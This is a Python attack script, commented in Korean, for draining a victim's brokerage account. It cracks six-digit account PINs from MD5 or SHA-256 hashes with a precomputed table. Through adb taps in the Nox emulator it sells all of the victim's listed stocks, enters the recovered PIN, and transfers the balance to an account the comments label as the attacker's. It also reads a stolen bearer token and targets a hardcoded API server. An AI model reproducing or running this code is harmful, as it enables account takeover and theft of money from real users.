import time
import subprocess
import hashlib
import pandas as pd
import json
import requests
from colorama import Fore, Style, init
from tqdm import tqdm

init(autoreset=True)

# 비밀번호 복호화를 위한 Rainbow Table 생성
md5_dict = {}
sha256_dict = {}

API_BASE_URL="http://43.202.240.147:8000/api"
BALANCE_ENDPOINT=f"{API_BASE_URL}/account/info"

def get_token_from_file(file_path='tokens.txt'):
    try:
        with open(file_path, 'r') as file:
            tokens = file.readlines()
            if tokens:
                # 가장 최근의 토큰 사용
                latest_token = tokens[-1].strip()
                return latest_token
            else:
                print(Fore.RED + "No tokens found in the file.")
                return None
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(Fore.RED + f"Error reading the file: {e}")
        return None

print(Fore.BLUE + Style.BRIGHT + "\n[INFO] Generating Rainbow Table...")
for i in tqdm(range(1000000), desc="Generating Rainbow Table"):
    accountPassword = f"{i:06}"  # 6자리 숫자로 포맷
    md5_hash = hashlib.md5(accountPassword.encode()).hexdigest()
    sha256_hash = hashlib.sha256(accountPassword.encode()).hexdigest()
    md5_dict[md5_hash] = accountPassword
    sha256_dict[sha256_hash] = accountPassword

def find_md5_password(md5_hash):
    return md5_dict.get(md5_hash, None)

def find_sha256_password(sha256_hash):
    return sha256_dict.get(sha256_hash, None)

def send_adb_command(command):
    result = subprocess.run(f'adb shell {command}', shell=True, capture_output=True, text=True)
    return result.stdout.strip()

# 버튼 클릭 좌표
def tap(x, y):
    send_adb_command(f'input tap {x} {y}')

# 입력 란에 값 입력
def input_text(text):
    send_adb_command(f'input text "{text}"')

# 텍스트 삭제
def delete_text(times):
    for _ in range(times):
        send_adb_command('input keyevent 67')  # '67' is the keycode for DEL
        time.sleep(0.1)

# 화면 스크롤
def swipe(start_x, start_y, end_x, end_y, duration=300):
    send_adb_command(f'input swipe {start_x} {start_y} {end_x} {end_y} {duration}')

# 계좌 비밀번호 입력 ( 비밀번호 입력 칸 좌표)
def enter_password(password):
    key_coordinates = {
        "0": (455, 713),
        "1": (210, 824),
        "2": (455, 824),
        "3": (700, 824),
        "4": (210, 665),
        "5": (455, 665),
        "6": (700, 665),
        "7": (210, 1046),
        "8": (455, 1046),
        "9": (700, 1046)
    }
    for digit in password:
        if digit in key_coordinates:
            x, y = key_coordinates[digit]
            tap(x, y)
            time.sleep(0.5)
        else:
            print(Fore.RED + f"Invalid digit in password: {digit}")
    print(Fore.GREEN + "Password 입력 완료")
    tap(700, 1130)
    time.sleep(1)
    print(Fore.GREEN + "Submit 버튼 클릭")

def automate_nox_player(stock_code, quantity, accountPassword):  ## 자동 보유 주식 전체 매도 기능 함수 
    print(Fore.BLUE + Style.BRIGHT + "\n[INFO] Starting automated nox player operations...")

    # 종목 코드 입력 칸 클릭 > 종목 코드 입력 > 종목 코드로 검색
    tap(172, 733)
    time.sleep(1)
    delete_text(6)
    time.sleep(1)
    input_text(str(stock_code))  # 종목 코드 입력
    time.sleep(1)
    tap(313, 733)  # 검색 버튼 클릭
    time.sleep(1)

    # 검색 후 매도를 수행하기 위해 화면을 스크롤 함
    swipe(299, 925, 272, 92)
    time.sleep(1)
    swipe(299, 925, 272, 92)
    time.sleep(1)
    swipe(299, 925, 272, 92)
    time.sleep(1)

    # 매도 수량 입력 필드 선택 및 입력
    tap(150, 1082)  # 매도 수량 입력 란
    time.sleep(1)
    delete_text(5)  # 기존 수량 6자리 숫자라 가정
    time.sleep(1)
    input_text(str(quantity))  # 매도 수량 입력
    time.sleep(2)
    tap(130, 1276)  # 매도 버튼 클릭
    time.sleep(1)

    # 비밀번호 입력 (각 숫자 키패드 좌표에 따라)
    enter_password(accountPassword)

    tap(237, 577)
    print(Fore.GREEN + "[SUCCESS] 거래 완료 버튼 클릭")
    time.sleep(2)

    # 다시 화면을 맨 위로 올리기
    swipe(272, 92, 299, 925)
    time.sleep(1)
    swipe(272, 92, 299, 925)
    time.sleep(1)
    swipe(272, 92, 299, 925)
    time.sleep(1)

def transfer_nox_player(accountPassword, myaccountnum):
    print(Fore.BLUE + Style.BRIGHT + "\n[INFO] Starting transfer operations...")

    # 계좌 이체 작업
    tap(750, 1530)  # 계좌 이체 버튼 좌표
    print(Fore.GREEN + "[SUCCESS] 계좌이체 버튼 클릭")
    time.sleep(3)
    
    # 잔액 가져와서 입력 (해당 좌표에 따라)
    tap(210, 1046)  # 이체 금액 입력란 클릭
    print(Fore.GREEN + "[SUCCESS] 이체 금액 입력란 클릭")
    time.sleep(2)

    #responce = requests.get(f"{BALANCE_ENDPOINT}/{user_id}", headers=headers)

    #if responce.status_code == 200:
    #    balance = responce.json().get("balance", 0)
    #else:


    #balance = send_adb_command('input tap 300, 1200')
    #balance = balance.replace(",", "")
    balance = input(Fore.YELLOW + "화면 상에 보이는 계좌 잔액 또는 원하는 이체 금액을 입력하세요: ")

    # 잔액 입력
    input_text(balance)
    time.sleep(2)

    # 다음 버튼
    tap(700, 1046)
    print(Fore.GREEN + "[SUCCESS] 다음 버튼 클릭")
    time.sleep(2)

    # 금융 기관 선택
    tap(750, 1130)
    print(Fore.GREEN + "[SUCCESS] 은행 목록 보기")
    time.sleep(2)

    # 은행 선택
    tap(700, 1350)
    time.sleep(2)
    print(Fore.GREEN + "[SUCCESS] 은행 선택")
    tap(750, 1130)

    # 공격자 계좌 입력
    tap(700, 1350)
    print(Fore.GREEN + "[SUCCESS] 공격자 계좌 입력")
    time.sleep(2)
    input_text(myaccountnum)  # 공격자 계좌 추가
    time.sleep(2)

    # 이체 버튼 터치
    tap(700, 1500)
    print(Fore.GREEN + "[SUCCESS] 이체 버튼 클릭")
    time.sleep(2)
    
    # 비밀번호 입력 (각 숫자 키패드 좌표에 따라)
    enter_password(accountPassword)
    
    # 돌아가기 버튼
    tap(455, 950)
    print(Fore.GREEN + "[SUCCESS] 돌아가기 버튼 클릭")
    time.sleep(2)

if __name__ == '__main__':
    print('''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶⡎⠉⠀⠙⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠉⠀⠀⠀⠀⠀⠈⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⣿⠛⠶⠤⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣥⣈⠉⠒⠦⣄⠀⣀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠛⠓⠲⣄⠈⠳⡌⠳⡀⠀⠀⠀⢸⣷⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⡇⠀⠀⠈⠳⡀⠈⢦⡹⡀⠀⠀⢸⠃⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠟⢳⣤⠀⢻⡿⣆⠀⢳⡗⠀⠀⡼⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⣤⡟⠀⠀⠈⠛⣆⠀⢷⠀⠀⡇⠀⠨⢧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣧⣠⠀⠀⠀⠘⣆⠈⠃⣰⠁⠀⠄⠸⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣷⡄⠀⠀⠀⠸⡅⢀⡏⠀⠀⠀⢠⠏⠱⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣷⣤⣠⠖⢻⠁⡼⠀⠀⢀⡴⠋⠀⠀⠈⢦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠉⢻⡻⣿⣿⣿⢧⣠⢏⣾⣡⠤⠚⣏⠀⠀⠀⠀⠀⠀⠉⠣⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⡿⠁⢠⢿⣿⢿⣿⡿⠋⣿⡏⠉⠀⠀⠀⣹⡞⠁⠀⠀⠀⠀⠀⠀⢸⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⣆⡴⡟⢸⢸⢰⡄⠀⠀⣹⢱⠀⠀⠀⢰⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣽⠃⣿⠀⠃⢸⢸⠘⡇⠀⠀⣿⢸⠀⠀⠀⠃⠀⢧⡄⢀⡴⠃⠀⠀⠀⠀⠘
⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⢿⡧⣿⠀⠀⡸⣾⠀⡇⠀⠀⣯⡏⠀⠀⠀⠀⠀⣸⡷⣫⣴⠀⠀⠀⢀⠂⢀
⠘⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣇⠀⠀⣿⠀⠀⡇⣿⠰⠇⠀⣸⢻⠇⠀⠀⠀⠀⢰⠿⠞⣫⢞⡠⠀⢀⠂⠀⢸
⠀⠘⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⣏⠻⣦⣤⣿⠀⠀⢧⡇⠀⠀⠀⢹⣾⠀⠀⠀⠀⢠⡏⣠⣼⣋⣉⣀⣴⣁⣀⣀⡎
⠀⠀⠈⢿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣷⡌⠙⠺⢭⡿⠀⠀⠸⠆⠀⠀⠀⢸⣿⡀⠀⠀⠀⡟⢀⡧⣄⣠⣠⣤⣤⣤⣀⣈⡇
⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠃⠀⠈⠢⠐⢤⣧⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⣼⠁⡼⠉⠛⠒⠒⠒⠒⠶⠶⢿⠁
⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⢀⣤⣛⡛⠛⢢⠀⠀⢠⠈⢪⣻⡇⠀⠀⠀⠀⠀⠀⠐⠃⠀⠀⢰⠏⢸⡧⠤⠤⠤⢤⣀⣀⡀⠀⡾⠀
⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⣀⣀⠤⠴⠒⠚⣩⠽⣿⠖⠋⠉⠀⠀⣦⠈⣧⠀⠈⣳⣼⡿⠛⠀⠀⠀⠀⠀⠀⠀⢀⡤⠴⠞⠀⣿⠓⠢⠤⠤⠤⠤⣌⣉⣻⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣭⣶⣦⣤⣶⠋⢡⣴⠇⢀⣴⡦⠀⣠⢿⣤⣿⡴⠒⢹⣏⣀⠀⠀⢀⣀⣀⠀⠀⢀⣠⣄⢀⣤⣾⡯⡀⠀⠉⠒⠒⠤⢤⣭⣽⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢠⣻⠃⡴⠛⢁⣴⡯⠇⠀⠀⠈⠉⠉⠉⢹⡍⠉⠉⠙⣷⠈⢻⠉⠻⠀⠘⣟⠻⠀⡉⠁⠀⠀⠀⠀⠀⠀⣠⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣮⣵⢰⣧⣞⣶⡿⢋⣡⠔⠚⣀⡀⠀⠀⠀⠀⢨⠇⠀⠀⠀⢹⠀⠈⠁⠀⠀⠀⠿⠀⠀⠈⠓⠶⠄⠀⠐⣲⡾⠋⡿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⢎⢠⠟⡠⣾⠟⢋⡠⠤⠤⢤⠤⠾⠤⠤⣤⢤⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠁⢀⣴⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⡙⠻⣿⣿⣿⣿⣝⡋⣮⣴⣞⣥⡄⠀⠀⢀⣀⡤⠴⠚⠛⠪⣟⡧⢤⣄⣠⣄⡐⠦⣤⣤⣤⠴⠚⠉⠀⠀⠀⣾⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⡄⠈⠙⢿⣿⣿⣿⣿⠟⠋⣁⣤⠴⠚⠉⠁⠀⠀⠀⠀⠀⠀⠉⠲⢤⡀⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⡄⠀⠀⢙⣹⣷⠶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣄⠀⠀⠀⠀⠀⠀⠀⠰⢚⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⡾⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠈⠛⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

          ''')

    # 파일에서 토큰을 가져옴
    token = get_token_from_file()
    if not token:
        print(Fore.RED + "토큰을 가져올 수 없습니다.")
        exit()
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # 엑셀 파일 읽기
    df = pd.read_excel('data.xlsx', dtype={'stock_code': str})
    # 로그인된 사용자 ID
    user_id = input(Fore.CYAN + "로그인된 사용자 ID를 입력하세요: ")
    # 해당 사용자에 맞는 종목만 처리
    user_stocks = df[df['user_id'] == int(user_id)]

    # 해시 값을 통해 비밀번호 복호화
    password = input(Fore.CYAN + "비밀번호 해시 값을 입력하세요: ")
    accountPassword = find_md5_password(password) or find_sha256_password(password)
    print(Fore.RED + "레인보우 테이블 실행 중 . . .")
    if not accountPassword:
        print(Fore.RED + "해시 값에 해당하는 비밀번호를 찾을 수 없습니다.")
        exit()
    else:
        print(Fore.GREEN + f"비밀번호를 찾았습니다: {accountPassword}")

    myaccountnum = input(Fore.CYAN + "입금할 계좌 번호를 입력하세요: ")

    for index, row in user_stocks.iterrows():
        stock_code = str(row['stock_code']).zfill(6)
        quantity = row['quantity']

        # Nox Player에서 자동화 작업 수행
        automate_nox_player(stock_code, quantity, accountPassword)

    # 계좌이체 함수 수행
    transfer_nox_player(accountPassword, myaccountnum)